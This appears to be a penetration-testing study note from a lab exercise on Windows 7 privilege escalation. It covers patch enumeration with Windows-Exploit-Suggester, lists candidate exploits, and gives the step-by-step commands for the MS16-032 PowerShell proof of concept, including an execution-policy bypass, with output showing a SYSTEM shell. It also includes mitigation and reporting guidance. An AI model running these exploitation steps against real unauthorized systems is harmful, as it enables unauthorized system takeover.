## Overview

Windows 7 reached end-of-life on:

```text
January 14, 2020
```

Even though it is unsupported, Windows 7 is still present in many environments.

Common sectors where Windows 7 may still appear:

- education
- retail
- transportation
- healthcare
- finance
- government
- manufacturing
- point-of-sale environments
- embedded or vendor-controlled systems

Legacy Windows 7 hosts may be missing years of security updates and may lack protections available in Windows 10.

> [!important]
> Do not treat every Windows 7 finding the same way. Business context matters. Some systems may be easy to upgrade, while others may support critical legacy applications or embedded devices.

---

# Windows 7 vs Windows 10 Security Features

| Feature | Windows 7 | Windows 10 |
|---|---:|---:|
| Microsoft Password / MFA |  | X |
| BitLocker | Partial | X |
| Credential Guard |  | X |
| Remote Credential Guard |  | X |
| Device Guard / Code Integrity |  | X |
| AppLocker | Partial | X |
| Windows Defender | Partial | X |
| Control Flow Guard |  | X |

Windows 7 lacks many modern protections that help reduce credential theft, kernel exploitation, and unauthorized code execution.

---

# Legacy Windows 7 Assessment Considerations

Windows 7 may still exist because of:

- legacy vendor software
- embedded point-of-sale systems
- cost of replacement
- operational downtime concerns
- unsupported hardware
- regulatory or business constraints
- large-scale deployment complexity

Example context:

```text
A retail organization may have hundreds of Windows 7 embedded POS devices across stores.
```

A single old Windows 7 workstation in a law firm may be straightforward to upgrade or remove, but a fleet of embedded POS devices may require a phased mitigation plan.

Recommendations should account for:

- business criticality
- replacement cost
- segmentation
- compensating controls
- vendor support limitations
- patch feasibility
- risk appetite

---

# Patch Enumeration Strategy

For Windows 7 privilege escalation, gather patch and system information first.

Useful methods:

- `systeminfo`
- `wmic qfe`
- Sherlock
- Windows-Exploit-Suggester
- Metasploit local exploit suggester
- manual CVE research

This note focuses on:

```text
Windows-Exploit-Suggester
```

Reference:

- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

---

# Gather systeminfo Output

Run `systeminfo` on the target.

```cmd
systeminfo
```

Example output:

```cmd
C:\htb> systeminfo

Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Registered Organization:
Product ID:                00371-222-9819843-86644
Original Install Date:     3/25/2021, 7:23:47 PM
System Boot Time:          5/13/2021, 5:14:12 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows

<SNIP>
```

Important values:

```text
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
System Type: x64-based PC
```

Save this output to a file on the attack machine.

Example filename:

```text
win7lpe-systeminfo.txt
```

---

# Update Windows-Exploit-Suggester Database

Update the local Microsoft vulnerability database.

```bash
sudo python2 windows-exploit-suggester.py --update
```

This saves the vulnerability database as a local Excel file.

Example filename:

```text
2021-05-13-mssb.xls
```

---

# Run Windows-Exploit-Suggester

Run the tool against the saved `systeminfo` output.

```bash
python2 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

Example output:

```text
Swordfish4051@htb[/htb]$ python2 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*] there are now 386 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
```

Confirmed target profile:

```text
Windows 7 SP1 64-bit
```

---

# Example Windows-Exploit-Suggester Findings

The output may contain a large number of possible vulnerabilities.

Example high-signal entries:

```text
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255

[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)

[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation

[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC

[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC

[E] MS16-059: Security Update for Windows Media Center (3150220) - Important
[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC

[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption

[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
```

Legend:

| Marker | Meaning |
|---|---|
| `[E]` | Exploit-DB PoC available |
| `[M]` | Metasploit module available |
| `[*]` | Missing bulletin or additional detail |

---

# Filtering Exploit Suggester Output

Windows-Exploit-Suggester can produce noisy results.

Filter out:

- denial-of-service exploits
- browser-only exploits if no browser path exists
- exploits for the wrong OS version
- exploits for the wrong architecture
- unreliable kernel exploits
- exploits requiring unavailable conditions
- modules that do not match the service pack or patch state

Prioritize:

- local privilege escalation
- target OS support
- target architecture support
- stable PoCs
- Metasploit modules where allowed
- public writeups with clear prerequisites
- exploits with low crash risk

> [!warning]
> Kernel exploits can crash legacy systems. Validate applicability and obtain approval before running them on fragile hosts.

---

# Interesting Candidate – MS16-032

## Overview

`MS16-032` is a privilege escalation issue in the Secondary Logon Service.

It affects multiple Windows versions, including:

```text
Windows 7
Windows 8.1
Windows 10
Windows Server 2008
Windows Server 2012
```

The Windows-Exploit-Suggester output identifies a PowerShell PoC for this issue.

Useful reference:

- [Project Zero bug 222 – Local WebDAV NTLM Reflection Elevation of Privilege](https://bugs.chromium.org/p/project-zero/issues/detail?id=222)
- [Exploit-DB 39719 – MS16-032 PowerShell PoC](https://www.exploit-db.com/exploits/39719/)
- [Exploit-DB 39809 – MS16-032 C# PoC](https://www.exploit-db.com/exploits/39809/)

---

# Exploiting MS16-032 with PowerShell PoC

## Step 1 – Bypass Execution Policy for Current Process

```powershell
Set-ExecutionPolicy bypass -scope process
```

Example prompt:

```text
Execution Policy Change

The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```

---

## Step 2 – Import PoC Module

```powershell
Import-Module .\Invoke-MS16-032.ps1
```

---

## Step 3 – Execute Exploit

```powershell
Invoke-MS16-032
```

Example output:

```powershell
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

Successful indicator:

```text
we have a SYSTEM shell
```

---

# Confirm SYSTEM Console

Run:

```cmd
whoami
```

Expected output:

```cmd
C:\htb> whoami

nt authority\system
```

---

# Metasploit Local Exploit Suggester

If a Meterpreter shell is already available, Metasploit can suggest local privilege escalation modules.

Useful module:

```text
post/multi/recon/local_exploit_suggester
```

This can quickly identify possible privilege escalation paths and Metasploit modules.

> [!tip]
> Use Metasploit suggestions as triage, not proof. Validate architecture, OS version, and crash risk before exploitation.

---

# Practical Decision Tree

## Is the host Windows 7?

Check:

```cmd
systeminfo
```

Look for:

```text
OS Name: Microsoft Windows 7
OS Version: 6.1.7601 Service Pack 1
```

---

## Is the target 32-bit or 64-bit?

Check:

```text
System Type
```

Example:

```text
x64-based PC
```

This affects exploit selection.

---

## Can you save systeminfo output?

Save output to the attack host:

```text
win7lpe-systeminfo.txt
```

Then run Windows-Exploit-Suggester offline.

---

## Are missing patches identified?

Run:

```bash
python2 windows-exploit-suggester.py --database <database.xls> --systeminfo <systeminfo.txt>
```

Look for:

```text
[M]
[E]
local privilege escalation
Windows 7 SP1 64-bit
```

---

## Which exploit candidate is safest?

Prioritize candidates that:

- match Windows 7 SP1
- match x64 if target is x64
- support local privilege escalation
- have reliable public PoCs
- do not only cause denial of service
- have clear prerequisites

In this example:

```text
MS16-032
```

stands out.

---

## Can PowerShell be used?

If yes:

```powershell
Set-ExecutionPolicy bypass -scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

If no, consider:

- C# PoC
- Metasploit module, if available
- alternate transfer/execution method
- another exploit candidate

---

# Troubleshooting

## Windows-Exploit-Suggester fails to parse systeminfo

Possible causes:

- incorrect encoding
- incomplete `systeminfo` output
- wrong file path
- unsupported language/localization issue
- Python dependency issue
- database file not updated or wrong format

Re-run:

```cmd
systeminfo
```

and save clean output.

---

## Tool output contains too many vulnerabilities

Filter by:

- OS version
- architecture
- local privilege escalation
- non-DoS
- exploit maturity
- available PoC
- patch date
- prerequisites

---

## MS16-032 PoC does not spawn SYSTEM

Possible causes:

- target is patched
- Secondary Logon Service state differs
- PowerShell restrictions
- AV/EDR interference
- wrong PowerShell architecture
- race condition failed
- exploit instability
- unsupported OS build

Try re-running only if safe and approved.

---

## Execution policy blocks import

Use current-process bypass:

```powershell
Set-ExecutionPolicy bypass -scope process
```

---

## PowerShell script is blocked by endpoint protection

Options depend on scope and rules of engagement:

- use a different approved PoC format
- test another vulnerability
- use Metasploit module if allowed
- perform manual patch validation
- report missing patch without exploitation

---

# Command Reference

## Gather system information

```cmd
systeminfo
```

## Update Windows-Exploit-Suggester database

```bash
sudo python2 windows-exploit-suggester.py --update
```

## Run Windows-Exploit-Suggester

```bash
python2 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

## Set PowerShell execution policy for current process

```powershell
Set-ExecutionPolicy bypass -scope process
```

## Import MS16-032 PoC

```powershell
Import-Module .\Invoke-MS16-032.ps1
```

## Execute MS16-032 PoC

```powershell
Invoke-MS16-032
```

## Confirm SYSTEM access

```cmd
whoami
```

## Metasploit local exploit suggester

```text
use post/multi/recon/local_exploit_suggester
```

---

# Cleanup Checklist

Remove staged tools and outputs:

```text
Invoke-MS16-032.ps1
Windows-Exploit-Suggester output
systeminfo text file
temporary payloads
PowerShell transcript or command output
Metasploit artifacts
```

Close elevated shells that are no longer needed.

Document:

- OS version and service pack
- architecture
- patch enumeration method
- missing patch evidence
- exploit selected
- exploitation result
- SYSTEM proof
- cleanup actions

---

# Defensive Notes

## Risks

Windows 7 hosts are high risk because they:

- are end-of-life
- lack modern exploit mitigations
- may miss years of security patches
- may run unsupported applications
- often have weaker endpoint protection
- can expose domain credentials if admins log in
- may be difficult to monitor effectively

---

# Mitigations

Organizations should:

- upgrade or decommission Windows 7 systems where possible
- isolate systems that cannot be upgraded
- restrict administrative logons
- disable unnecessary services
- apply extended support updates where available
- use strict firewall rules
- block lateral movement paths
- deploy compensating monitoring controls
- remove local admin password reuse
- apply application allowlisting
- limit network access to required systems only

---

# Reporting Considerations

Avoid reporting only:

```text
Upgrade Windows 7.
```

Instead, include:

- why the system exists
- what business function it supports
- exploitability evidence
- likely impact
- compensating controls observed
- practical mitigation plan
- timeline recommendation
- segmentation and access control improvements

---

# Key Takeaways

- Windows 7 reached end-of-life on January 14, 2020.
- Windows 7 lacks many protections present in Windows 10.
- `systeminfo` output can be used offline with Windows-Exploit-Suggester.
- Windows-Exploit-Suggester compares installed hotfixes against known bulletins and exploit data.
- Exploit suggester output must be filtered to remove noise and irrelevant entries.
- `MS16-032` is a useful Windows 7 privilege escalation candidate when the host is missing the patch.
- The PowerShell PoC can spawn a SYSTEM console on vulnerable hosts.
- Legacy systems require careful handling, business-aware recommendations, and cleanup.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Legacy Windows]]
- [[Windows 7]]
- [[Missing Patches]]
- [[Windows-Exploit-Suggester]]
- [[Sherlock]]
- [[MS16-032]]
- [[Secondary Logon Service]]
- [[Metasploit Local Exploit Suggester]]
- [[Patch Management]]
- [[Systeminfo]]

---

# Tags

#windows
#privilege-escalation
#windows-7
#legacy-windows
#missing-patches
#windows-exploit-suggester
#systeminfo
#ms16-032
#secondary-logon
#powershell
#metasploit
#pentesting